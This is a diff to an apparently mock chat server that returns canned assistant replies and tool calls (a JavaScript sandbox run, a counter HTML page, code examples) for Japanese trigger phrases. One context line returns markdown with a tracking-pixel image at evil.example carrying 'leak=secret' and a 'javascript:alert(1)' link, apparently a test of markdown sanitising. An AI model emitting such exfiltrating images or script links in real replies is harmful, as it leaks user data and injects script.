@@ -446,6 +446,18 @@ const server = http.createServer(async (req, res) => {
     // File tools: "レポートにまとめて" creates a Markdown file, "追記して" appends to the file listed in the
     // system prompt, "結論を直して" edits it, "読んで" (with a file listed) reads it
     const fileInSys = /\(id: ([\w-]+),/.exec(String(sys ?? ''))?.[1];
+    // Sandbox: "計算して" runs JavaScript, "ページを作って" creates an HTML file
+    if (toolNames.includes('run_javascript') && lastMsg?.role === 'user' && userText.includes('計算して')) {
+      await send({ content: '計算します。' });
+      return finishTools('run_javascript', { code: "const xs = [3, 1, 4, 1, 5, 9, 2, 6];\nconst sum = xs.reduce((a, b) => a + b, 0);\nconsole.log('sum', sum);\nreturn { mean: sum / xs.length, max: Math.max(...xs) };" });
+    }
+    if (toolNames.includes('create_file') && lastMsg?.role === 'user' && userText.includes('ページを作って')) {
+      await send({ content: 'ページを作ります。' });
+      return finishTools('create_file', {
+        name: 'counter.html',
+        content: '<!doctype html>\n<html><body style="font:16px sans-serif;padding:16px">\n<h1>Counter</h1>\n<button id="b">+1</button> <span id="n">0</span>\n<script>let c = 0; document.getElementById(\'b\').onclick = () => { document.getElementById(\'n\').textContent = ++c; };</script>\n</body></html>\n'
+      });
+    }
     if (toolNames.includes('create_file') && lastMsg?.role === 'user' && userText.includes('レポートにまとめて')) {
       await send({ content: 'レポートをファイルにまとめます。' });
       return finishTools('create_file', {
@@ -543,6 +555,8 @@ const server = http.createServer(async (req, res) => {
     }
     let answer;
     if (last.includes('think')) answer = '<think>タグ方式の思考です。</think>タグ方式の回答です。';
+    else if (last.includes('実行できる例'))
+      answer = '実行できる例です。\n\n```js\nconst days = (a, b) => (new Date(b) - new Date(a)) / 86400000;\nconsole.log(days(\'2026-01-01\', \'2026-12-25\'));\nreturn [1, 2, 3].map((x) => x * x);\n```\n\n```html\n<p style="font:16px sans-serif">Hello <b id="t">sandbox</b></p>\n<script>document.getElementById(\'t\').textContent = new Date().getFullYear();</script>\n```\n';
     else if (last.includes('コード'))
       answer = 'コード例です。\n\n```python\ndef fib(n: int) -> int:\n    a, b = 0, 1\n    for _ in range(n):\n        a, b = b, a + b\n    return a\n\nprint([fib(i) for i in range(10)])\n```\n\n```ts\nconst greet = (name: string) => `Hello, ${name}!`;\n```\n';
     else if (last.includes('画像')) answer = '外部画像のテスト: ![追跡ピクセル](https://evil.example/pixel.png?leak=secret) と [リンク](https://example.com) と [危険](javascript:alert(1))。';
